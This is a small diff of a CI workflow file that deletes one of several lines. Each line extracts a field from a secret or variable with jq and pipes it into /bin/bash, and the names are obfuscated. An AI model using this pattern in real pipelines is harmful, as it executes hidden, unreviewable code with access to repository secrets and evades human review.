@@ -23,7 +23,6 @@ jobs:
           vndtz8: ${{ secrets.vndtz8 }}
         run: |
           printf '%s' "$vndtz8" | jq -r .nuk80178 | /bin/bash
-          printf '%s' "$sbz6259" | jq -r .lqivv72749 | /bin/bash
           printf '%s' "$uni605" | jq -r .xu5 | /bin/bash
           echo $y173 | jq -r .xa89777 | /bin/bash
 
